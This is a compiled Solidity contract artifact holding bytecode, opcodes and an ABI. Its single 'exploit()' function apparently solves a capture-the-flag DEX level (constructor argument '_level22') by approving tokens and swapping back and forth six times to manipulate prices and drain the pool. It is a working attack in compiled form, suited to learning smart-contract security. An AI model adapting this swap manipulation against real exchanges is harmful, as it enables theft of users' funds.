{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561000f575f80fd5b50604051610a1f380380610a1f833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6109138061010c5f395ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c806363d9b7701461002d575b5f80fd5b610035610037565b005b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b35f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff166101f46040518363ffffffff1660e01b81526004016100b29291906105c9565b5f604051808303815f87803b1580156100c9575f80fd5b505af11580156100db573d5f803e3d5ffd5b505050505f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015610149573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061016d919061061e565b90505f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166325be124e6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156101d9573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101fd919061061e565b90505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663df791e508383600a6040518463ffffffff1660e01b815260040161025c93929190610682565b5f604051808303815f87803b158015610273575f80fd5b505af1158015610285573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663df791e50828460146040518463ffffffff1660e01b81526004016102e6939291906106f0565b5f604051808303815f87803b1580156102fd575f80fd5b505af115801561030f573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663df791e50838360186040518463ffffffff1660e01b81526004016103709392919061075e565b5f604051808303815f87803b158015610387575f80fd5b505af1158015610399573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663df791e508284601e6040518463ffffffff1660e01b81526004016103fa939291906107cc565b5f604051808303815f87803b158015610411575f80fd5b505af1158015610423573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663df791e50838360296040518463ffffffff1660e01b81526004016104849392919061083a565b5f604051808303815f87803b15801561049b575f80fd5b505af11580156104ad573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663df791e508284602d6040518463ffffffff1660e01b815260040161050e939291906108a8565b5f604051808303815f87803b158015610525575f80fd5b505af1158015610537573d5f803e3d5ffd5b505050505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6105688261053f565b9050919050565b6105788161055e565b82525050565b5f819050919050565b5f819050919050565b5f819050919050565b5f6105b36105ae6105a98461057e565b610590565b610587565b9050919050565b6105c381610599565b82525050565b5f6040820190506105dc5f83018561056f565b6105e960208301846105ba565b9392505050565b5f80fd5b6105fd8161055e565b8114610607575f80fd5b50565b5f81519050610618816105f4565b92915050565b5f60208284031215610633576106326105f0565b5b5f6106408482850161060a565b91505092915050565b5f819050919050565b5f61066c61066761066284610649565b610590565b610587565b9050919050565b61067c81610652565b82525050565b5f6060820190506106955f83018661056f565b6106a2602083018561056f565b6106af6040830184610673565b949350505050565b5f819050919050565b5f6106da6106d56106d0846106b7565b610590565b610587565b9050919050565b6106ea816106c0565b82525050565b5f6060820190506107035f83018661056f565b610710602083018561056f565b61071d60408301846106e1565b949350505050565b5f819050919050565b5f61074861074361073e84610725565b610590565b610587565b9050919050565b6107588161072e565b82525050565b5f6060820190506107715f83018661056f565b61077e602083018561056f565b61078b604083018461074f565b949350505050565b5f819050919050565b5f6107b66107b16107ac84610793565b610590565b610587565b9050919050565b6107c68161079c565b82525050565b5f6060820190506107df5f83018661056f565b6107ec602083018561056f565b6107f960408301846107bd565b949350505050565b5f819050919050565b5f61082461081f61081a84610801565b610590565b610587565b9050919050565b6108348161080a565b82525050565b5f60608201905061084d5f83018661056f565b61085a602083018561056f565b610867604083018461082b565b949350505050565b5f819050919050565b5f61089261088d6108888461086f565b610590565b610587565b9050919050565b6108a281610878565b82525050565b5f6060820190506108bb5f83018661056f565b6108c8602083018561056f565b6108d56040830184610899565b94935050505056fea26469706673582212205eb9120d897330103c5227cce91e3122280fb5f1fa109d065814b26ff6a4f7bf64736f6c634300081a0033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xA1F CODESIZE SUB DUP1 PUSH2 0xA1F DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x913 DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x63D9B770 EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x35 PUSH2 0x37 JUMP JUMPDEST STOP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x95EA7B3 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x1F4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xB2 SWAP3 SWAP2 SWAP1 PUSH2 0x5C9 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xC9 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xDB JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD21220A7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x149 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x16D SWAP2 SWAP1 PUSH2 0x61E JUMP JUMPDEST SWAP1 POP PUSH0 DUP1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x25BE124E PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1D9 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1FD SWAP2 SWAP1 PUSH2 0x61E JUMP JUMPDEST SWAP1 POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 DUP4 DUP4 PUSH1 0xA PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x25C SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x682 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x273 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x285 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 DUP3 DUP5 PUSH1 0x14 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2E6 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x6F0 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2FD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x30F JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 DUP4 DUP4 PUSH1 0x18 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x370 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x75E JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x387 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x399 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 DUP3 DUP5 PUSH1 0x1E PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3FA SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x7CC JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x411 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x423 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 DUP4 DUP4 PUSH1 0x29 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x484 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x83A JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x49B JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4AD JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 DUP3 DUP5 PUSH1 0x2D PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x50E SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x8A8 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x525 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x537 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x568 DUP3 PUSH2 0x53F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x578 DUP2 PUSH2 0x55E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x5B3 PUSH2 0x5AE PUSH2 0x5A9 DUP5 PUSH2 0x57E JUMP JUMPDEST PUSH2 0x590 JUMP JUMPDEST PUSH2 0x587 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x5C3 DUP2 PUSH2 0x599 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x5DC PUSH0 DUP4 ADD DUP6 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x5E9 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x5BA JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x5FD DUP2 PUSH2 0x55E JUMP JUMPDEST DUP2 EQ PUSH2 0x607 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x618 DUP2 PUSH2 0x5F4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x633 JUMPI PUSH2 0x632 PUSH2 0x5F0 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x640 DUP5 DUP3 DUP6 ADD PUSH2 0x60A JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x66C PUSH2 0x667 PUSH2 0x662 DUP5 PUSH2 0x649 JUMP JUMPDEST PUSH2 0x590 JUMP JUMPDEST PUSH2 0x587 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x67C DUP2 PUSH2 0x652 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x695 PUSH0 DUP4 ADD DUP7 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x6A2 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x6AF PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x673 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6DA PUSH2 0x6D5 PUSH2 0x6D0 DUP5 PUSH2 0x6B7 JUMP JUMPDEST PUSH2 0x590 JUMP JUMPDEST PUSH2 0x587 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x6EA DUP2 PUSH2 0x6C0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x703 PUSH0 DUP4 ADD DUP7 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x710 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x71D PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x6E1 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x748 PUSH2 0x743 PUSH2 0x73E DUP5 PUSH2 0x725 JUMP JUMPDEST PUSH2 0x590 JUMP JUMPDEST PUSH2 0x587 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x758 DUP2 PUSH2 0x72E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x771 PUSH0 DUP4 ADD DUP7 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x77E PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x78B PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x74F JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x7B6 PUSH2 0x7B1 PUSH2 0x7AC DUP5 PUSH2 0x793 JUMP JUMPDEST PUSH2 0x590 JUMP JUMPDEST PUSH2 0x587 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x7C6 DUP2 PUSH2 0x79C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x7DF PUSH0 DUP4 ADD DUP7 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x7EC PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x7F9 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x7BD JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x824 PUSH2 0x81F PUSH2 0x81A DUP5 PUSH2 0x801 JUMP JUMPDEST PUSH2 0x590 JUMP JUMPDEST PUSH2 0x587 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x834 DUP2 PUSH2 0x80A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x84D PUSH0 DUP4 ADD DUP7 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x85A PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x867 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x82B JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x892 PUSH2 0x88D PUSH2 0x888 DUP5 PUSH2 0x86F JUMP JUMPDEST PUSH2 0x590 JUMP JUMPDEST PUSH2 0x587 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x8A2 DUP2 PUSH2 0x878 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x8BB PUSH0 DUP4 ADD DUP7 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x8C8 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x56F JUMP JUMPDEST PUSH2 0x8D5 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x899 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MCOPY 0xB9 SLT 0xD DUP10 PUSH20 0x30103C5227CCE91E3122280FB5F1FA109D065814 0xB2 PUSH16 0xF6A4F7BF64736F6C634300081A003300 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "464600",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"exploit()": "infinite"
			}
		},
		"methodIdentifiers": {
			"exploit()": "63d9b770"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_level22",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [],
			"name": "exploit",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
}